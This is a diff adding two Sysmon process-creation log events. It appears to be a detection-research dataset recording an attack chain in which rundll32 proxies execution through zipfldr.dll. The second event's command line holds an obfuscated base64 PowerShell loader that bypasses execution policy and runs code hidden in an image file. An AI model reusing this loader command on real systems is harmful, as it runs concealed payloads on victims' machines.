@@ -1,0 +1,250 @@
+[
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-08-14 12:17:14.614738+00:00"
+                },
+                "EventRecordID": "10674",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2004",
+                    "@ThreadID": "4480"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "MSEDGEWIN10",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-08-14 12:17:14.447"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{747f3d96-fbca-5d53-0000-0010b8664100}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "2476"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\rundll32.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "10.0.17763.1 (WinBuild.160101.0800)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows host process (Rundll32)"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\system32\\rundll32.exe\" zipfldr.dll,RouteTheCall shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Windows\\system32\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "MSEDGEWIN10\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{747f3d96-f419-5d53-0000-002026910200}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000029126"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{747f3d96-f41e-5d53-0000-001067c80300}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "4824"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\explorer.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "C:\\Windows\\Explorer.EXE"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-08-14 12:17:14.893929+00:00"
+                },
+                "EventRecordID": "10675",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "2004",
+                    "@ThreadID": "4480"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "MSEDGEWIN10",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-08-14 12:17:14.661"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{747f3d96-fbca-5d53-0000-001036784100}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "2876"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wscript.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "5.812.10240.16384"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Microsoft \u00ae Windows Based Script Host"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft \u00ae Windows Script Host"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"c:\\windows\\system32\\wscript.exe\" /E:vbs c:\\windows\\temp\\icon.ico \"powershell -exec bypass -c \"\"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp')))\"\"\""
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Windows\\system32\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "MSEDGEWIN10\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{747f3d96-f419-5d53-0000-002026910200}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000029126"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=267D05CE8D10D97620BE1C7773757668BAEB19EE,MD5=F5E5DF6C9D62F4E940B334954A2046FC,SHA256=47CACD60D91441137D055184614B1A418C0457992977857A76CA05C75BBC1B56,IMPHASH=0F71D5F6F4CBB935CE1B09754102419C"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{747f3d96-fbca-5d53-0000-0010b8664100}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "2476"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\rundll32.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "\"C:\\Windows\\system32\\rundll32.exe\" zipfldr.dll,RouteTheCall shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}"
+                    }
+                ]
+            }
+        }
+    }
+]
